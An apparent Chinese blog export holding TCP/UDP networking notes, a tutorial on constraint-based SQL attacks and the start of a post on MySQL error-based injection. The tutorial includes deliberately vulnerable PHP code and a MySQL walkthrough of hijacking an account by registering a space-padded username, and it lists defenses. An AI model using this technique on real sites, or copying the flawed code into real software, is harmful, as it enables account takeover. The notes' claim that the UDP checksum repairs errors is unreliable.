<p>一种改进的方式，就是让发送方有请求就发送出去，而不是等待响应。通过这样的处理方式，发送的数据连在了一起，响应的数据也连在了一起，吞吐量就提升了。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP%20%E8%AF%B7%E6%B1%82-%E5%93%8D%E5%BA%94%E6%A8%A1%E5%9E%8B.png" alt="TCP 请求-响应模型"></p>
<p>如果同时发送的数据非常多，比如成百上千个 TCP 段都需要发送，这个时候带宽可能会不足，像下图这样。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP%20%E8%AF%B7%E6%B1%82-%E5%93%8D%E5%BA%94%E6%A8%A1%E5%9E%8B%E9%98%9F%E5%88%97.png" alt="TCP 请求-响应模型队列"></p>
<h3 id="2-排队"><a href="#2-排队" class="headerlink" title="2. 排队"></a>2. 排队</h3><p>这种情况下，通常我们会考虑排队（Queuing）机制。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/TCP%E6%8E%92%E9%98%9F%E6%9C%BA%E5%88%B6.png" alt="TCP排队机制"><br>考虑上图这个模型，在 TCP 层实现一个队列，新元素从队列的一端（左侧）排队准备发送，从队列的右侧发送离开。可以思考一下，这个模型有什么问题？</p>
<p>这样做需要多个队列，要将未发送的数据从队列中取出，加入发送中的队列。然后再将发送中的数据，收到 ACK 的部分取出，放入已接收的队列。而发送中的封包，何时收到 ACK 是一件不确定的事情，这样使用队列似乎也有一定的问题。</p>
<h3 id="3-滑动窗口"><a href="#3-滑动窗口" class="headerlink" title="3. 滑动窗口"></a>3. 滑动窗口</h3><p>在上面的模型当中，之所以觉得算法不好设计，是因为用错了数据结构。这里应该用一种叫作<strong>滑动窗口</strong>的数据结构去实现。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A31.png" alt="滑动窗口1"></p>
<ul>
<li>深绿色代表已经收到 ACK 的段</li>
<li>浅绿色代表发送了，但是没有收到 ACK 的段</li>
<li>白色代表没有发送的段</li>
<li>紫色代表暂时不能发送的段</li>
</ul>
<p>下面重新设计一下不同类型封包的顺序，将已发送的数据放到最左边，发送中的数据放到中间，未发送的数据放到右边。假设我们最多同时发送 5 个封包，也就是窗口大小 = 5。窗口中的数据被同时发送出去，然后等待 ACK。如果一个封包 ACK 到达，将它标记为已接收（深绿色）。</p>
<p>如下图所示，有两个封包的 ACK 到达，因此标记为绿色。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A32.png" alt="滑动窗口2"></p>
<p>这个时候滑动窗口可以向右滑动，如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A33.png" alt="滑动窗口3"></p>
<h3 id="4-重传"><a href="#4-重传" class="headerlink" title="4. 重传"></a>4. 重传</h3><p>如果发送过程中，部分数据没能收到 ACK 会怎样呢？这就可能发生重传。</p>
<p>如果发生下图这样的情况，段 4 迟迟没有收到 ACK。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A34.png" alt="滑动窗口4"></p>
<p>这个时候滑动窗口只能右移一个位置，如下图所示：<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A35.png" alt="滑动窗口5"></p>
<p>在这个过程中，如果后来段 4 重传成功（接收到 ACK），那么窗口就会继续右移。如果段 4 发送失败，还是没能收到 ACK，那么接收方也会抛弃段 5、段 6、段 7。这样从段 4 开始之后的数据都需要重发。</p>
<h3 id="5-快速重传"><a href="#5-快速重传" class="headerlink" title="5. 快速重传"></a>5. 快速重传</h3><p>在 TCP 协议中，如果接收方想丢弃某个段，可以选择不发 ACK。发送端超时后，会重发这个 TCP 段。而有时候，接收方希望催促发送方尽快补发某个 TCP 段，这个时候可以使用快速重传能力。</p>
<p>例如段 1、段 2、段 4 到了，但是段 3 没有到。 接收方可以发送多次段 3 的 ACK。如果发送方收到多个段 3 的 ACK，就会重发段 3。这个机制称为快速重传。这和超时重发不同，是一种催促的机制。</p>
<p>为了不让发送方误以为段 3 已经收到了，在快速重传的情况下，接收方即便收到发来的段 4，依然会发段 3 的 ACK（不发段 4 的 ACK），直到发送方把段 3 重传。</p>
<p>实际操作中，每个 TCP 段的大小不同，限制数量会让接收方的缓冲区不好操作，因此实际操作中窗口大小单位是字节数。</p>
<h3 id="6-流速控制"><a href="#6-流速控制" class="headerlink" title="6. 流速控制"></a>6. 流速控制</h3><p>发送、接收窗口的大小可以用来控制 TCP 协议的流速。窗口越大，同时可以发送、接收的数据就越多，支持的吞吐量也就越大。当然，窗口越大，如果数据发生错误，损失也就越大，因为需要重传越多的数据。</p>
<p>举个例子：我们用 RTT 表示 Round Trip Time，就是消息一去一回的时间。</p>
<p>假设 RTT = 1ms，带宽是 1mb/s。如果窗口大小为 1kb，那么 1ms 可以发送一个 1kb 的数据（含 TCP 头），1s 就可以发送 1mb 的数据，刚好可以将带宽用满。如果 RTT 再慢一些，比如 RTT = 10ms，那么这样的设计就只能用完 1/10 的带宽。 当然你可以提高窗口大小提高吞吐量，但是实际的模型会比这个复杂，因为还存在重传、快速重传、丢包等因素。</p>
<p>而实际操作中，也不可以真的把带宽用完，所以最终我们会使用折中的方案，在延迟、丢包率、吞吐量中进行选择，毕竟鱼和熊掌不可兼得。</p>
<h3 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h3><p>为了提高传输速率，TCP 协议选择将多个段同时发送，为了让这些段不至于被接收方拒绝服务，在发送前，双方要协商好发送的速率。但是我们不可能完全确定网速，所以协商的方式，就变成确定窗口大小。</p>
<p>有了窗口，发送方利用滑动窗口算法发送消息；接收方构造缓冲区接收消息，并给发送方 ACK。滑动窗口的实现只需要数组和少量的指针即可，是一个非常高效的算法。像这种算法，简单又实用，比如求一个数组中最大的连续 k 项和，就可以使用滑动窗口算法。如果你对这个问题感兴趣，不妨用你最熟悉的语言尝试解决一下。</p>
<p><strong>滑动窗口和流速控制是怎么回事？</strong><br>滑动窗口是 TCP 协议控制可靠性的核心。发送方将数据拆包，变成多个分组。然后将数据放入一个拥有滑动窗口的数组，依次发出，仍然遵循先入先出（FIFO）的顺序，但是窗口中的分组会一次性发送。窗口中序号最小的分组如果收到 ACK，窗口就会发生滑动；如果最小序号的分组长时间没有收到 ACK，就会触发整个窗口的数据重新发送。<br>另一方面，在多次传输中，网络的平均延迟往往是相对固定的，这样 TCP 协议可以通过双方协商窗口大小控制流速。补充下，上面我们说的分组和 TCP 段是一个意思。</p>
<h1 id="05-UDP-协议：TCP协议和-UDP-协议的优势和劣势"><a href="#05-UDP-协议：TCP协议和-UDP-协议的优势和劣势" class="headerlink" title="05 | UDP 协议：TCP协议和 UDP 协议的优势和劣势"></a>05 | UDP 协议：TCP协议和 UDP 协议的优势和劣势</h1><p>TCP 最核心的价值是提供了可靠性，而 UDP 最核心的价值是灵活，你几乎可以用它来做任何事情。例如：HTTP 协议 1.1 和 2.0 基于 TCP，HTTP 3.0 开始用 UDP。</p>
<p>UDP 在数据传输、网络控制、音视频、Web 技术中，都有很重要的地位。</p>
<h3 id="1-UDP-协议"><a href="#1-UDP-协议" class="headerlink" title="1. UDP 协议"></a>1. UDP 协议</h3><p>UDP（User Datagram Protocol），目标是在传输层提供直接发送报文（Datagram）的能力。Datagram 是数据传输的最小单位。UDP 协议不会帮助拆分数据，它的目标只有一个，就是发送报文。</p>
<p>为什么不直接调用 IP 协议呢？ 如果裸发数据，IP 协议不香吗？<br>传输层协议在承接上方应用层的调用，需要提供应用到应用的通信——因此要附上端口号。每个端口，代表不同的应用。传输层下层的 IP 协议，承接传输层的调用，将数据从主机传输到主机。IP 层不能区分应用，导致哪怕是在 IP 协议上进行简单封装，也需要单独一个协议。这就构成了 UDP 协议的市场空间。</p>
<h3 id="2-UDP-的封包格式"><a href="#2-UDP-的封包格式" class="headerlink" title="2. UDP 的封包格式"></a>2. UDP 的封包格式</h3><p>UDP 的设计目标就是在允许用户直接发送报文的情况下，最大限度地简化应用的设计。下图是 UDP 的报文格式。<br><img src="https://cdn.jsdelivr.net/gh/cs-cshi/image-host/computer_network_lagou/UDP%20%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png" alt="UDP 的报文格式"></p>
<ul>
<li>Source Port 是源端口号。因为 UDP 协议的特性（不需要 ACK），因此这个字段是可以省略的。但有时候对于防火墙、代理来说，Source Port 有很重要的意义，它们需要用这个字段行过滤和路由。</li>
<li>Destination Port 是目标端口号（这个字段不可以省略）。</li>
<li>Length 是消息体长度。</li>
<li>Checksum 是校验和，作用是检查封包是否出错。</li>
<li>Data octets 就是一个字节一个字节的数据，Octet 是 8 位。</li>
</ul>
<p>校验数据在传输过程中有没有丢失、损坏是一个普遍需求。<br>一种最简单的校验和就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">checksum&#x3D;(a+b+c+d) ^ 0xff</span><br></pre></td></tr></table></figure>
<p>如果发送方用上述方式计算出 Checksum，并将 a,b,c,d 和 Checksum 一起发送给接收方，接收方就可以用同样的算法再计算一遍，这样就可以确定数据有没有发生损坏（变化）。当然 Checksum 的做法，只适用于数据发生少量变化的情况。如果数据发生较大的变动，校验和也可能发生碰撞。</p>
<p>UDP 的可靠性保证仅仅就是 Checksum 一种。如果一个数据封包 Datagram 发生了数据损坏，UDP 可以通过 Checksum 纠错或者修复。 但是 UDP 没有提供再多的任何机制，比如 ACK、顺序保证以及流控等。</p>
<h3 id="3-UDP-与-TCP-的区别"><a href="#3-UDP-与-TCP-的区别" class="headerlink" title="3. UDP 与 TCP 的区别"></a>3. UDP 与 TCP 的区别</h3><ol>
<li><p>目的差异<br>TCP 协议的核心目标是提供可靠的网络传输，而 UDP 的目标是在提供报文交换能力基础上尽可能地简化协议轻装上阵。</p>
</li>
<li><p>可靠性差异<br>TCP 核心是要在保证可靠性提供更好的服务。TCP 会有握手的过程，需要建立连接，保证双方同时在线。而且TCP 有时间窗口持续收集无序的数据，直到这一批数据都可以合理地排序组成连续的结果。</p>
</li>
</ol>
<p>UDP 并不具备以上这些特性，它只管发送数据封包，而且 UDP 不需要 ACK，这意味着消息发送出去成功与否 UDP 是不管的。</p>
<ol start="3">
<li><p>连接 vs 无连接<br>TCP 是一个面向连接的协议（Connection-oriented Protocol），传输数据必须先建立连接。 UDP 是一个无连接协议（Connection-less Protocol），数据随时都可以发送，只提供发送封包（Datagram）的能力。</p>
</li>
<li><p>流控技术（Flow Control）<br>TCP 使用了流控技术来确保发送方不会因为一次发送过多的数据包而使接收方不堪重负。TCP 在发送缓冲区中存储数据，并在接收缓冲区中接收数据。当应用程序准备就绪时，它将从接收缓冲区读取数据。如果接收缓冲区已满，接收方将无法处理更多数据，并将其丢弃。UDP 没有提供类似的能力。</p>
</li>
<li><p>传输速度<br>UDP 协议简化，封包小，没有连接、可靠性检查等，因此单纯从传输速度上讲，UDP 更快。</p>
</li>
<li><p>场景差异<br>TCP 每个数据封包都需要确认，因此天然不适应高速数据传输场景，比如观看视频（流媒体应用）、网络游戏（TCP 有延迟）等。具体来说，如果网络游戏用 TCP，每个封包都需要确认，可能会造成一定的延迟；再比如音、视频传输天生就允许一定的丢包率；Ping 和 DNSLookup，这类型的操作只需要一次简单的请求/返回，不需要建立连接，用 UDP 就足够了。</p>
</li>
</ol>
<p>近些年有一个趋势，TCP/UDP 的边界逐渐变得模糊，UDP 应用越来越多。比如传输文件，如果考虑希望文件无损到达，可以用 TCP。如果考虑希望传输足够块，就可能会用 UDP。再比如 HTTP 协议，如果考虑请求/返回的可靠性，用 TCP 比较合适。但是像 HTTP 3.0 这类应用层协议，从功能性上思考，暂时没有找到太多的优化点，但是想要把网络优化到极致，就会用 UDP 作为底层技术，然后在 UDP 基础上解决可靠性。</p>
<p>所以理论上，任何一个用 TCP 协议构造的成熟应用层协议，都可以用 UDP 重构。这就好比，本来用一个工具可以解决所有问题，但是如果某一类问题体量非常大，就会专门为这类问题创造工具。因此，UDP 非常适合需要定制工具的场景。</p>
<p>把场景分成三类，TCP 应用场景、UDP 应用场景、模糊地带（TCP、UDP 都可以考虑）</p>
<ul>
<li>第一类：TCP 场景<ul>
<li>远程控制（SSH）</li>
<li>File Transfer Protocol（FTP） </li>
<li>邮件（SMTP、IMAP）等</li>
<li>点对点文件传出（微信等）</li>
</ul>
</li>
<li>第二类：UDP 场景<ul>
<li>网络游戏</li>
<li>音视频传输</li>
<li>DNS</li>
<li>Ping</li>
<li>直播</li>
</ul>
</li>
<li>第三类：模糊地带<ul>
<li>HTTP（目前以 TCP 为主）</li>
<li>文件传输 </li>
</ul>
</li>
</ul>
<p><strong>UDP 不提供可靠性，不代表我们不能解决可靠性。UDP 的核心价值是灵活、轻量，构造了最小版本的传输层协议。在这个之上，还可以实现连接（Connection），实现会话（Session），实现可靠性（Reliability）</strong></p>
<h3 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h3><p><strong>TCP 最核心的价值就是提供封装好的一套解决可靠性的优秀方案</strong>。解决可靠性是非常复杂的，要考虑非常多的因素。TCP 帮助我们在确保吞吐量、延迟、丢包率的基础上，保证可靠性。TCP 的成功在于它给人们提供了很多现成、好用的能力。</p>
<p>UDP 则不同，<strong>UDP 提供了最小版的实现，只支持 Checksum</strong>。<strong>UDP 最核心的价值是灵活、轻量、传输速度快</strong>。考虑到不同应用的特性，如果不使用一个大而全的方案，为自己的应用特性量身定做，可能会做得更好。比如网络游戏中游戏客户端不断向服务端发送玩家的位置，如果某一次消息丢失了，只要这个消息不影响最终的游戏结果，就可以只看下一个消息。不同应用有不同的特性，需要的可靠性级别不一样，这就是越来越多的应用开始使用 UDP 的原因之一。</p>
<p>TCP 协议和 UDP 协议根本不存在什么优势和劣势，只不过是场景不同，选择不同而已。最后还有一个非常重要的考虑因素就是<strong>成本，如果没有足够专业的团队解决网络问题，TCP 无疑会是更好的选择。</strong></p>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>基于约束的SQL攻击</title>
    <url>/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%95%B0%E7%9A%84SQL%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<p>sql 中 insert 和 select 对字符串处理方式的差异造成的漏洞</p>
<span id="more"></span>

<h2 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1. 背景介绍"></a>1. 背景介绍</h2><p>一个有趣的代码片段，开发者尝试各种方法来确保数据库的安全访问，当新用户尝试注册时，将运行以下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// Checking whether a user with the same username exists</span></span><br><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT *</span></span><br><span class="line"><span class="string">          FROM users</span></span><br><span class="line"><span class="string">          WHERE username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = mysql_query(<span class="variable">$query</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(mysql_num_rows(<span class="variable">$res</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// User exists, exit gracefully</span></span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// If not, only then insert a new entry</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;INSERT INTO users(username, password)</span></span><br><span class="line"><span class="string">              VALUES (&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用以下代码验证登录信息：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;SELECT username FROM users</span></span><br><span class="line"><span class="string">          WHERE username=&#x27;<span class="subst">$username</span>&#x27;</span></span><br><span class="line"><span class="string">              AND password=&#x27;<span class="subst">$password</span>&#x27; &quot;</span>;</span><br><span class="line"><span class="variable">$res</span> = mysql_query(<span class="variable">$query</span>, <span class="variable">$database</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(mysql_num_rows(<span class="variable">$res</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$row</span> = mysql_fetch_assoc(<span class="variable">$res</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">Null</span>;</span><br></pre></td></tr></table></figure>

<p>安全考虑:</p>
<blockquote>
<ul>
<li>过滤用户输入参数了吗？ – 完成检查</li>
<li>使用单引号（’）来增加安全性了吗？ – 完成检查</li>
</ul>
</blockquote>
<h2 id="2-攻击手法"><a href="#2-攻击手法" class="headerlink" title="2. 攻击手法"></a>2. 攻击手法</h2><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;vampire     &#x27;</span>;</span><br><span class="line"></span><br><span class="line">等同于</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;vampire&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>也存在异常情况，最好的例子就是 LIKE 子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p>
<blockquote>
<p>SQL Server follows the ANSI/ISO SQL-92 specification (Section 8.2, <Comparison Predicate>, General rules #3) on how to compare strings with spaces. The ANSI standard requires padding for the character strings used in comparisons so that their lengths match before comparing them. The padding directly affects the semantics of WHERE and HAVING clause predicates and other Transact-SQL string comparisons. For example, Transact-SQL considers the strings ‘abc’ and ‘abc ‘ to be equivalent for most comparison operations.</p>
<p>The only exception to this rule is the LIKE predicate. When the right side of a LIKE predicate expression features a value with a trailing space, SQL Server does not pad the two values to the same length before the comparison occurs. Because the purpose of the LIKE predicate, by definition, is to facilitate pattern searches rather than simple string equality tests, this does not violate the section of the ANSI SQL-92 specification mentioned earlier.</p>
<p><a href="https://support.microsoft.com/en-us/topic/inf-how-sql-server-compares-strings-with-trailing-spaces-b62b1a2d-27d3-4260-216d-a605719003b0">https://support.microsoft.com/en-us/topic/inf-how-sql-server-compares-strings-with-trailing-spaces-b62b1a2d-27d3-4260-216d-a605719003b0</a></p>
</blockquote>
<p>在所有的 INSERT 查询中，SQL都会根据 varchar(n) 来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。</p>
<p>而攻击就是利用 select 与 insert 对长度和空格处理方式不同造成的漏洞。</p>
<p>select 语句对于参数后面空格的处理是删除，insert 只是截取最大长度的字符串，然后插入数据库。</p>
<p>假设最大长度限制为25 我们输入用户名为 admin[20个空格]1,密码随意。在本文一开始的代码逻辑中，select 检查的时候实际用的是 admin1，这时数据库中是不存在 admin1 的，（假设数据库中已经存在 admin），所以会执行 insert 操作。</p>
<p>但由于 select 与 insert 机制不同，insert 会直接截断，插入的是 admin[20个空格]，由于 SQL 处理字符串的机制，实际插入的就变成了 admin，这样库中就插入了两条 admin。</p>
<h2 id="3-攻击演示"><a href="#3-攻击演示" class="headerlink" title="3. 攻击演示"></a>3. 攻击演示</h2><p>现在，让我们建立一个测试数据库来演示具体攻击过程。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vampire@linux:~$ mysql -u root -p</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE DATABASE testing;</span></span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> USE testing;</span></span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure>

<p>接着创建一个数据表users，其包含username和password列，并且字段的最大长度限制为25个字符。然后，我将向username字段插入“vampire”，向password字段插入“my_password”。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> CREATE TABLE users (</span></span><br><span class="line">    -&gt;   username varchar(25),</span><br><span class="line">    -&gt;   password varchar(25)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.09 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> INSERT INTO users</span></span><br><span class="line">    -&gt; VALUES(&#x27;vampire&#x27;, &#x27;my_password&#x27;);</span><br><span class="line">Query OK, 1 row affected (0.11 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM users;</span></span><br><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| vampire  | my_password |</span><br><span class="line">+----------+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>为了展示尾部空白字符的修剪情况，我们可以键入下列命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM users</span></span><br><span class="line">    -&gt; WHERE username=&#x27;vampire       &#x27;;</span><br><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| vampire  | my_password |</span><br><span class="line">+----------+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>现在我们假设一个存在漏洞的网站使用了前面提到的PHP代码来处理用户的注册及登录过程。为了侵入任意用户的帐户（在本例中为“vampire”），只需要使用用户名“vampire[许多空白符]1”和一个随机密码进行注册即可。对于选择的用户名，前25个字符应该只包含vampire和空白字符，这样做将有助于绕过检查特定用户名是否已存在的查询。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM users</span></span><br><span class="line">    -&gt; WHERE username=&#x27;vampire                   1&#x27;;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>需要注意的是，在执行SELECT查询语句时，SQL是不会将字符串缩短为25个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当执行INSERT查询语句时，它只会插入前25个字符。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash">   INSERT INTO users(username, password)</span></span><br><span class="line">    -&gt; VALUES (&#x27;vampire                   1&#x27;, &#x27;random_pass&#x27;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.05 sec)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM users</span></span><br><span class="line">    -&gt; WHERE username=&#x27;vampire&#x27;;</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">| username                  | password    |</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">| vampire                   | my_password |</span><br><span class="line">| vampire                   | random_pass |</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>现在我们检索“vampire”的，将返回两个独立用户。注意，第二个用户名实际上是“vampire”加上尾部的18个空格。现在，如果使用用户名“vampire”和密码“random_pass”登录的话，则所有搜索该用户名的SELECT查询都将返回第一个数据记录，也就是原始的数据记录。这样的话，攻击者就能够以原始用户身份登录。这个攻击已经在MySQL和SQLite上成功通过测试。我相信在其他情况下依旧适用。</p>
<h2 id="4-防护手段"><a href="#4-防护手段" class="headerlink" title="4. 防护手段"></a>4. 防护手段</h2><ol>
<li><p>将要求或者预期具有唯一性的那些列加上UNIQUE约束。</p>
<blockquote>
<p>实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。</p>
</blockquote>
</li>
<li><p>最好使用’id’作为数据库表的主键。并且数据应该通过程序中的 id 进行跟踪</p>
</li>
<li><p>为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</p>
</li>
</ol>
<p>————————————————<br>参考来源：</p>
<ul>
<li><a href="https://www.freebuf.com/articles/web/124537.html">基于约束的SQL攻击</a>，来自<a href="https://www.freebuf.com/">FreeBuf.COM</a></li>
<li><a href="https://dhavalkapil.com/blogs/SQL-Attack-Constraint-Based/">SQL Attack (Constraint-based)</a></li>
<li><a href="https://blog.csdn.net/weixin_41489908/article/details/108481692">基于约束的sql攻击</a>,来自<a href="https://www.csdn.net/">CSDN</a></li>
<li><a href="https://www.k0rz3n.com/2017/06/03/passsignup/">基于约束的SQL攻击</a>,来自<a href="https://www.k0rz3n.com/">K0rz3n’s Blog</a></li>
</ul>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>CTF</category>
        <category>Web 安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>Web 安全</tag>
      </tags>
  </entry>
  <entry>
    <title>报错注入</title>
    <url>/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
<span id="more"></span>

<p>这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
<ol>
<li>BIGINT等数据类型溢出</li>
<li>xpath语法错误</li>
<li>concat+rand()+group_by()导致主键重复</li>
<li>一些特性</li>
</ol>
<p>下面就针对这几种错误类型看看背后的原理是怎样的。</p>
<h2 id="1-数据溢出"><a href="#1-数据溢出" class="headerlink" title="1. 数据溢出"></a>1. 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/8.0/en/integer-types.html">Integer Types (Exact Value)</a>，如下表：</p>
<table>
<thead>
<tr>
<th>Type</th>
<th>Storage (Bytes)</th>
<th>Minimum Value Signed</th>
<th>Minimum Value Unsigned</th>
<th>Maximum Value Signed</th>
<th>Maximum Value Unsigned</th>
</tr>
</thead>
<tbody><tr>
<td>TINYINT</td>
<td>1</td>
<td>-128</td>
<td>0</td>
<td>127</td>
<td>255</td>
</tr>
<tr>
<td>SMALLINT</td>
<td>2</td>
<td>-32768</td>
<td>0</td>
<td>32767</td>
<td>65535</td>
</tr>
<tr>
<td>MEDIUMINT</td>
<td>3</td>
<td>-8388608</td>
<td>0</td>
<td>8388607</td>
<td>16777215</td>
</tr>
<tr>
<td>INT</td>
<td>4</td>
<td>-2147483648</td>
<td>0</td>
<td>2147483647</td>
<td>4294967295</td>
</tr>
<tr>
<td>BIGINT</td>
<td>8</td>
<td>-9223372036854775808</td>
<td>0</td>
<td>9223372036854775807</td>
<td>18446744073709551615</td>
</tr>
</tbody></table>
<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/8.0/en/out-of-range-and-overflow.html">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select 18446744073709551615+1;</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(18446744073709551615 + 1)&#x27;</span><br></pre></td></tr></table></figure>

<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
